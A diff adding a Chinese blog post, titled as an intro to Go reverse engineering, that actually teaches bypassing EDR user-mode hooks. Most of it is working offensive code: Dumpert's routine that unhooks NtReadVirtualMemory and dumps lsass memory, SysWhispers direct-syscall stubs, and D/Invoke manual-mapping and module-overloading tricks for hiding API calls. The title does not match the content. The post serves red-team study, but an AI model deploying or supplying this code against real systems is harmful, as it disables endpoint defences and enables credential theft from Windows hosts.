@@ -1,0 +1,586 @@
+---
+layout: post
+title: 初识Go逆向
+date: 2020-12-10 14:20:12 +0900
+category: AntiEDR
+---
+### 0x01 前言
+
+　　这几年，端点检测和响应平台(Endpoint detection and response)-EDR越来越受到重视，EDR产品的功能基本包含实时端点监控、数据分析、威胁检测和拦截以及威胁发现能力。EDR的监控点之一是在应用层进行Hook，在渗透测试或者red-team交战中，一些开源的攻击性安全工具会很容易被EDR的应用层Hook点发现和拦截。下面介绍几种可以用来绕过EDR的应用层Hook的方法
+编译，定位到文件目录
+
+### 0x02 Hook钩子还原
+
+　　EDR的Hook一般会在系统DLL的函数头进行Hook，比如会Hook NtWriteVirtualMemory的函数，并将NtWriteVirtualMemory开头的字节码改为jmp指令，调到EDR的DLL中进行监控判断是否是一个恶意的行为。所以这种对抗方法，可以Patch该API的JMP指令，来还原Hook，进行绕过EDR，下图为移除Cylance的钩子代码：
+
+![1](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/1.png)
+
+　　该方案的缺点是，需要针对不同EDR厂商的补丁进行还原，不同EDR厂商的挂钩点API以及挂钩位置都可能不一致。
+
+　　不同厂商的挂钩位置可以参考 [https://github.com/D3VI5H4/Antivirus-Artifacts](https://github.com/D3VI5H4/Antivirus-Artifacts)
+
+### 0x03  Dumpert工具直接syscall调用Native API恢复NtReadVirtualMemory钩子来实现dump lsass的绕过
+
+　　[Dumpert](https://github.com/outflanknl/Dumpert) 工具不直接调用API，这个工具会直接使用汇编来恢复NtReadVirtualMemory的钩子，然后调用MiniDumpWriteDump来dump lsass，代码如下：
+
+　　通过汇编代码调用ZwWriteVirtualMemory、ZwProtectVirtualMemory来UnHook NtReadVirtualMemory，
+
+```
+BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
+    BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};
+
+    if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
+        AssemblyBytes[4] = pWinVerInfo->SystemCall;
+        ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
+        ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
+        AssemblyBytes[4] = pWinVerInfo->SystemCall;
+        ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
+        ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
+        AssemblyBytes[4] = pWinVerInfo->SystemCall;
+        ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
+        ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
+        AssemblyBytes[4] = pWinVerInfo->SystemCall;
+        ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
+        ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
+    }
+    else {
+        return FALSE;
+    }
+
+    LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);
+
+    LPVOID lpBaseAddress = lpProcAddress;
+    ULONG OldProtection, NewProtection;
+    SIZE_T uSize = 10;
+    NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
+    if (status != STATUS_SUCCESS) {
+        return FALSE;
+    }
+
+    status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
+    if (status != STATUS_SUCCESS) {
+        return FALSE;
+    }
+
+    status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
+    if (status != STATUS_SUCCESS) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
+```
+
+　　Unhook NtReadVirtualMemory之后，通过汇编调用ZwOpenProcess、ZwCreateFile来打开lsass进程、创建dump文件，然后再调用MiniDumpWriteDump来创建lsass的dump
+
+```
+__declspec(dllexport) void __cdecl Dump() {
+
+    if (sizeof(LPVOID) != 8) {
+        exit(1);
+    }
+
+    if (!IsElevated()) {
+        exit(1);
+    }
+
+    SetDebugPrivilege();
+
+    PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));
+
+    // First set OS Version/Architecture specific values
+    OSVERSIONINFOEXW osInfo;
+    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+
+    _RtlGetVersion RtlGetVersion = (_RtlGetVersion)
+        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
+    if (RtlGetVersion == NULL) {
+        exit(1);
+    }
+
+    RtlGetVersion(&osInfo);
+    swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
+    pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;
+
+    // Now create os/build specific syscall function pointers.
+    if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
+        ZwOpenProcess = &ZwOpenProcess10;
+        ZwClose = &ZwClose10;
+        NtCreateFile = &NtCreateFile10;
+        pWinVerInfo->SystemCall = 0x3F;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
+        ZwOpenProcess = &ZwOpenProcess7SP1;
+        ZwClose = &ZwClose7SP1;
+        NtCreateFile = &NtCreateFile7SP1;
+        pWinVerInfo->SystemCall = 0x3C;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
+        ZwOpenProcess = &ZwOpenProcess80;
+        ZwClose = &ZwClose80;
+        NtCreateFile = &NtCreateFile80;
+        pWinVerInfo->SystemCall = 0x3D;
+    }
+    else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
+        ZwOpenProcess = &ZwOpenProcess81;
+        ZwClose = &ZwClose81;
+        NtCreateFile = &NtCreateFile81;
+        pWinVerInfo->SystemCall = 0x3E;
+    }
+    else {
+        exit(1);
+    }
+
+    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
+        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
+    if (RtlInitUnicodeString == NULL) {
+        exit(1);
+    }
+
+    RtlInitUnicodeString(&pWinVerInfo->ProcName, L"lsass.exe");
+
+    if (!GetPID(pWinVerInfo)) {
+        exit(1);
+    }
+
+    pWinVerInfo->lpApiCall = "NtReadVirtualMemory";
+
+    if (!Unhook_NativeAPI(pWinVerInfo)) {
+        exit(1);
+    }
+
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+    CLIENT_ID uPid = { 0 };
+
+    uPid.UniqueProcess = pWinVerInfo->hTargetPID;
+    uPid.UniqueThread = (HANDLE)0;
+
+    NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
+    if (hProcess == NULL) {
+        exit(1);
+    }
+
+    WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
+    WCHAR chWinPath[MAX_PATH];
+    GetWindowsDirectory(chWinPath, MAX_PATH);
+    wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
+    wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dumpert.dmp");
+
+    UNICODE_STRING uFileName;
+    RtlInitUnicodeString(&uFileName, chDmpFile);
+
+    HANDLE hDmpFile = NULL;
+    IO_STATUS_BLOCK IoStatusBlock;
+    ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
+    OBJECT_ATTRIBUTES FileObjectAttributes;
+    InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    //  Open input file for writing, overwrite existing file.
+    status = NtCreateFile(&hDmpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
+        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+    if (hDmpFile == INVALID_HANDLE_VALUE) {
+        ZwClose(hProcess);
+        exit(1);
+    }
+
+    DWORD dwTargetPID = GetProcessId(hProcess);
+    BOOL Success = MiniDumpWriteDump(hProcess,
+        dwTargetPID,
+        hDmpFile,
+        MiniDumpWithFullMemory,
+        NULL,
+        NULL,
+        NULL);
+
+    ZwClose(hDmpFile);
+    ZwClose(hProcess);
+
+    return;
+}
+```
+
+　　我们可以看看汇编代码的实现，主要是通过对API的Index赋值到eax，然后调用syscall
+
+![2](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/2.png)
+
+　　这里存在一个问题，不同版本的windows中ntdll里面API调用的Index不一样，汇编代码会有差异，所以这里需要针对不同windows版本适配需要调用的汇编代码：
+
+　　[https://github.com/outflanknl/Dumpert/blob/master/Dumpert-DLL/Outflank-Dumpert-DLL/Syscalls.asm](https://github.com/outflanknl/Dumpert/blob/master/Dumpert-DLL/Outflank-Dumpert-DLL/Syscalls.asm)
+
+　　直接调用汇编代码这种方案可以直接绕开EDR的应用层Hook，不过缺点就是需要对各个windows各个版本进行大量的适配。
+
+　　可以通过 [Syswhispers](https://github.com/jthuraisamy/SysWhispers) 或 [Syswhispers2](https://github.com/jthuraisamy/SysWhispers2) 工具来解析ntdll.dll中的Index，其中Syswhispers2减少了asm文件的大小，Dumpert、Syswhispers、Syswhispers2目前都只支持x64位的Syscall，如果需要x86的Syscall，可以参考SysWhispers2_x86 
+
+![3](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/3.png)
+
+ 　　其中Syswhispers、Syswhispers2都需要安装python3，我们尝试通过Syswhispers用以下命令获取NtProtectVirtualMemory的汇编代码
+
+　　>py .\syswhispers.py --functions NtProtectVirtualMemory,NtWriteVirtualMemory -o syscalls_mem
+
+　　其中syscalls_mem.asm代码如下：
+
+```
+.code
+
+NtProtectVirtualMemory PROC
+    mov rax, gs:[60h]                            ; Load PEB into RAX.
+NtProtectVirtualMemory_Check_X_X_XXXX:               ; Check major version.
+    cmp dword ptr [rax+118h], 5
+    je  NtProtectVirtualMemory_SystemCall_5_X_XXXX
+    cmp dword ptr [rax+118h], 6
+    je  NtProtectVirtualMemory_Check_6_X_XXXX
+    cmp dword ptr [rax+118h], 10
+    je  NtProtectVirtualMemory_Check_10_0_XXXX
+    jmp NtProtectVirtualMemory_SystemCall_Unknown
+NtProtectVirtualMemory_Check_6_X_XXXX:               ; Check minor version for Windows Vista/7/8.
+    cmp dword ptr [rax+11ch], 0
+    je  NtProtectVirtualMemory_Check_6_0_XXXX
+    cmp dword ptr [rax+11ch], 1
+    je  NtProtectVirtualMemory_Check_6_1_XXXX
+    cmp dword ptr [rax+11ch], 2
+    je  NtProtectVirtualMemory_SystemCall_6_2_XXXX
+    cmp dword ptr [rax+11ch], 3
+    je  NtProtectVirtualMemory_SystemCall_6_3_XXXX
+    jmp NtProtectVirtualMemory_SystemCall_Unknown
+NtProtectVirtualMemory_Check_6_0_XXXX:               ; Check build number for Windows Vista.
+    cmp word ptr [rax+120h], 6000
+    je  NtProtectVirtualMemory_SystemCall_6_0_6000
+    cmp word ptr [rax+120h], 6001
+    je  NtProtectVirtualMemory_SystemCall_6_0_6001
+    cmp word ptr [rax+120h], 6002
+    je  NtProtectVirtualMemory_SystemCall_6_0_6002
+    jmp NtProtectVirtualMemory_SystemCall_Unknown
+NtProtectVirtualMemory_Check_6_1_XXXX:               ; Check build number for Windows 7.
+    cmp word ptr [rax+120h], 7600
+    je  NtProtectVirtualMemory_SystemCall_6_1_7600
+    cmp word ptr [rax+120h], 7601
+    je  NtProtectVirtualMemory_SystemCall_6_1_7601
+    jmp NtProtectVirtualMemory_SystemCall_Unknown
+NtProtectVirtualMemory_Check_10_0_XXXX:              ; Check build number for Windows 10.
+    cmp word ptr [rax+120h], 10240
+    je  NtProtectVirtualMemory_SystemCall_10_0_10240
+    cmp word ptr [rax+120h], 10586
+    je  NtProtectVirtualMemory_SystemCall_10_0_10586
+    cmp word ptr [rax+120h], 14393
+    je  NtProtectVirtualMemory_SystemCall_10_0_14393
+    cmp word ptr [rax+120h], 15063
+    je  NtProtectVirtualMemory_SystemCall_10_0_15063
+    cmp word ptr [rax+120h], 16299
+    je  NtProtectVirtualMemory_SystemCall_10_0_16299
+    cmp word ptr [rax+120h], 17134
+    je  NtProtectVirtualMemory_SystemCall_10_0_17134
+    cmp word ptr [rax+120h], 17763
+    je  NtProtectVirtualMemory_SystemCall_10_0_17763
+    cmp word ptr [rax+120h], 18362
+    je  NtProtectVirtualMemory_SystemCall_10_0_18362
+    cmp word ptr [rax+120h], 18363
+    je  NtProtectVirtualMemory_SystemCall_10_0_18363
+    cmp word ptr [rax+120h], 19041
+    je  NtProtectVirtualMemory_SystemCall_10_0_19041
+    cmp word ptr [rax+120h], 19042
+    je  NtProtectVirtualMemory_SystemCall_10_0_19042
+    jmp NtProtectVirtualMemory_SystemCall_Unknown
+NtProtectVirtualMemory_SystemCall_5_X_XXXX:          ; Windows XP and Server 2003
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_0_6000:          ; Windows Vista SP0
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_0_6001:          ; Windows Vista SP1 and Server 2008 SP0
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_0_6002:          ; Windows Vista SP2 and Server 2008 SP2
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_1_7600:          ; Windows 7 SP0
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 SP0
+    mov eax, 004dh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012
+    mov eax, 004eh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2
+    mov eax, 004fh
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_19041:        ; Windows 10.0.19041 (2004)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_10_0_19042:        ; Windows 10.0.19042 (20H2)
+    mov eax, 0050h
+    jmp NtProtectVirtualMemory_Epilogue
+NtProtectVirtualMemory_SystemCall_Unknown:           ; Unknown/unsupported version.
+    ret
+NtProtectVirtualMemory_Epilogue:
+    mov r10, rcx
+    syscall
+    ret
+NtProtectVirtualMemory ENDP
+```
+
+　　syscalls_mem.h代码如下：
+
+```
+#pragma once
+
+#include <Windows.h>
+
+EXTERN_C NTSTATUS NtProtectVirtualMemory(
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID * BaseAddress,
+    IN OUT PSIZE_T RegionSize,
+    IN ULONG NewProtect,
+    OUT PULONG OldProtect);
+```
+
+　　可以看到是生成的syscalls_mem.c先通过gs:[60h]获取PEB地址，然后通过PEB->OSMajorVersion、PEB->OSMinorVersion判断版本号，调用对应NtProtectVirtualMemory的Index
+
+```
+nt!_PEB 
+   +0x118 OSMajorVersion   : Uint4B
+   +0x11c OSMinorVersion   : Uint4B
+```
+
+　　SysWhispers2测试如下，会生成syscalls_mem.c、syscalls_mem.h、syscalls_mem_stubs.asm共三个文件。
+
+　　syscalls_mem_stubs.asm代码如下，使用NtProtectVirtualMemory的Hash名称传递给SW2_GetSyscallNumber函数
+
+```
+.code
+
+EXTERN SW2_GetSyscallNumber: PROC
+
+NtProtectVirtualMemory PROC
+    push rcx                   ; Save registers.
+    push rdx
+    push r8
+    push r9
+    mov ecx, 00D9F0319h        ; Load function hash into ECX.
+    call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.
+    pop r9                     ; Restore registers.
+    pop r8
+    pop rdx
+    pop rcx
+    mov r10, rcx
+    syscall                    ; Invoke system call.
+    ret
+NtProtectVirtualMemory ENDP
+
+end
+```
+
+　　SW2_GetSyscallNumber具体实现如下，获取到NTDLL的地址，获取相关导出函数进行排序，保存函数名HASH
+
+```
+SW2_SYSCALL_LIST SW2_SyscallList;
+
+DWORD SW2_HashSyscall(PCSTR FunctionName)
+{
+    DWORD i = 0;
+    DWORD Hash = SW2_SEED;
+
+    while (FunctionName[i])
+    {
+        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
+        Hash ^= PartialName + SW2_ROR8(Hash);
+    }
+
+    return Hash;
+}
+
+BOOL SW2_PopulateSyscallList()
+{
+    // Return early if the list is already populated.
+    if (SW2_SyscallList.Count) return TRUE;
+
+    PSW2_PEB Peb = (PSW2_PEB)__readgsqword(0x60);
+    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
+    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
+    PVOID DllBase = NULL;
+
+    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
+    // in the list, so it's safer to loop through the full list and find it.
+    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
+    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
+    {
+        DllBase = LdrEntry->DllBase;
+        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
+        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
+        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
+        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+        if (VirtualAddress == 0) continue;
+
+        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW2_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
+
+        // If this is NTDLL.dll, exit loop.
+        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
+
+        if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
+        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;
+    }
+
+    if (!ExportDirectory) return FALSE;
+
+    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
+    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
+    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
+    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
+
+    // Populate SW2_SyscallList with unsorted Zw* entries.
+    DWORD i = 0;
+    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
+    do
+    {
+        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
+
+        // Is this a system call?
+        if (*(USHORT*)FunctionName == 'wZ')
+        {
+            Entries[i].Hash = SW2_HashSyscall(FunctionName);
+            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
+
+            i++;
+            if (i == SW2_MAX_ENTRIES) break;
+        }
+    } while (--NumberOfNames);
+
+    // Save total number of system calls found.
+    SW2_SyscallList.Count = i;
+
+    // Sort the list by address in ascending order.
+    for (DWORD i = 0; i < SW2_SyscallList.Count - 1; i++)
+    {
+        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
+        {
+            if (Entries[j].Address > Entries[j + 1].Address)
+            {
+                // Swap entries.
+                SW2_SYSCALL_ENTRY TempEntry;
+
+                TempEntry.Hash = Entries[j].Hash;
+                TempEntry.Address = Entries[j].Address;
+
+                Entries[j].Hash = Entries[j + 1].Hash;
+                Entries[j].Address = Entries[j + 1].Address;
+
+                Entries[j + 1].Hash = TempEntry.Hash;
+                Entries[j + 1].Address = TempEntry.Address;
+            }
+        }
+    }
+
+    return TRUE;
+}
+
+EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
+{
+    // Ensure SW2_SyscallList is populated.
+    if (!SW2_PopulateSyscallList()) return -1;
+
+    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
+    {
+        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
+        {
+            return i;
+        }
+    }
+
+    return -1;
+}
+```
+
+　　Nim使用asm绕过EDR可以参考NimlineWhispers，该项目的使用blog可以参考[https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/](https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/)
+
+### 0x04 P/Invoke to D/Invoke
+
+ 　　P/Invoke基本上是从Windows库文件静态导入API调用的默认方式，这种方式容易被检测。D/Invoke是在运行时手动加载Windows API函数，病使用指向其在内存中位置的指针来调用该函数。安全软件不会检查比如读取ntdll.dll内存的行为，因此不会hook这个读入内存的ntdll.dll，这个读入的ntdll.dll中执行代码是不会被监控到的。
+ 
+ ![4](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/4.png)
+ 
+ 　　代码[https://github.com/NVISOsecurity/DInvisibleRegistry](https://github.com/NVISOsecurity/DInvisibleRegistry)共使用了三种D/Invoke的方法
+
+#### 1. 动态调用，这种方法可以绕过IAT Hook
+
+```
+public static DInvoke.Data.Native.NTSTATUS NtOpenKey(
+   ref IntPtr keyHandle,
+   STRUCTS.ACCESS_MASK desiredAccess,
+   ref STRUCTS.OBJECT_ATTRIBUTES objectAttributes)
+{
+    object[] funcargs =
+    {
+        keyHandle,desiredAccess,objectAttributes
+    };
+    DInvoke.Data.Native.NTSTATUS retvalue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke(@"ntdll.dll", @"NtOpenKey", typeof(DELEGATES.NtOpenKey), ref funcargs);
+    keyHandle = (IntPtr)funcargs[0];
+    return retvalue;}
+```
+
+#### 2. Manual Mapping ，这种方法将目标文件加载到内存中，然后使用加载到内存中文件导出的API，核心代码如下：
+
+```
+DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = new DInvoke.Data.PE.PE_MANUAL_MAP();
+mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
+
+retValue = (DInvoke.Data.Native.NTSTATUS)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenKey", typeof(DELEGATES.NtOpenKey), ntOpenKeyParams, false);
+keyHandle = (IntPtr)ntOpenKeyParams[0];
+```
+
+#### 3. OverloadMapping，会先将目标文件加载到内存中，然后覆盖一个合法路径的文件内存，所以执行起来，像是从磁盘上合法DLL执行的，代码如下：
+
+```
+DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = DInvoke.ManualMap.Overload.OverloadModule(@"C:\Windows\System32\ntdll.dll");
+Console.WriteLine("Decoy module is found!\n Using: {0} as a decoy", mappedDLL.DecoyModule);
+```
+
+　　执行后可以看到，Overload了workfolderssvc.dll，并且可以看到NtOpenKey操作的堆栈也是从workfolderssvc.dll发出
+
+![5](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/5.png)
+
+![6](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2021-02-17/6.png)
+
+ 　　 参考[https://offensivedefence.co.uk/posts/dinvoke-syscalls/](https://offensivedefence.co.uk/posts/dinvoke-syscalls/)，我们还有种Syscalls的绕过方案DInvoke.DynamicInvoke.Generic.GetSyscallStub
+ 
+ ```
+IntPtr pAllocateSysCall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
+NtAllocateVirtualMemory fSyscallAllocateMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(pAllocateSysCall, typeof(NtAllocateVirtualMemory));
+```
+
+ 　　 参考：[https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/)
